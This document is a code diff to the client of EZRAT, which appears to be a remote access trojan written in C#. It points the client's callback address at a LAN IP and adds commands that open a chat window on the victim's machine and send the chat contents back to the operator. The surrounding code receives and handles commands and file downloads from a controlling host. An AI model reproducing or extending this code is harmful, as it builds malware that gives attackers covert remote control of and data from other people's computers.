@@ -10,10 +10,11 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Security.Cryptography;
 using EZRATClient.Utils;
+using EZRATClient.Forms;
 
 namespace EZRATClient
 {
-    class Program
+    public class Program
     {
 
 
@@ -28,7 +29,7 @@ namespace EZRATClient
         const int SW_SHOW = 5;
 
 
-        static string _ip = "127.0.0.1";
+        static string _ip = "192.168.1.112";
         static int _port = 1234;
 
         public static string Ip { get => _ip; set => _ip = value; }
@@ -49,6 +50,10 @@ namespace EZRATClient
             get { return _isDiconnect; }
             set { _isDiconnect = value; }
         }
+
+        private static Chat cht = null;
+
+        private static Thread TChat;
 
 
         #region Variables
@@ -256,6 +261,32 @@ namespace EZRATClient
 
                 SendCommand(response);
             }
+            else if (text.StartsWith("chat;"))
+            {
+                string options = text.Substring(5);
+                string[] tmp = options.Split(';');
+                string msg;
+
+                msg = tmp[0];
+                if (cht == null)
+                {
+                    cht = new Chat(msg);
+                    TChat = new Thread(() => cht.ShowDialog());
+                    TChat.Start();
+                }
+                else
+                {
+                    cht.NewMessage(msg);
+                }
+
+
+            } else if (text.StartsWith("chatdata;"))
+            {
+                if (cht != null)
+                {
+                    SendCommand("chatdata;" + String.Join("¦",cht.Texted));
+                }
+            }
         }
 
 
@@ -287,7 +318,7 @@ namespace EZRATClient
         private static void ReceiveResponse()
         {
 
-            byte[] buffer = new byte[2048]; //The receive buffer
+            byte[] buffer = new byte[4096]; //The receive buffer
 
             try
             {
@@ -296,7 +327,6 @@ namespace EZRATClient
                 if (received == 0) return; //If failed to received data return
                 byte[] data = new byte[received]; //Create a new buffer with the exact data size
                 Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer
-
                 if (isFileDownload) //File download is in progress
                 {
                     Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length); //Copy the file data to memory
@@ -336,13 +366,13 @@ namespace EZRATClient
             }
             catch (Exception ex) //Somethind went wrong
             {
-                Console.WriteLine("Connection ended");
+                Console.WriteLine($"Connection ended\n{ex.Message}");
                 isDisconnect = true;
             }
         }
 
 
-        private static void SendCommand(string response)
+        public static void SendCommand(string response)
         {
             if (!_clientSocket.Connected) //If the client isn't connected
             {
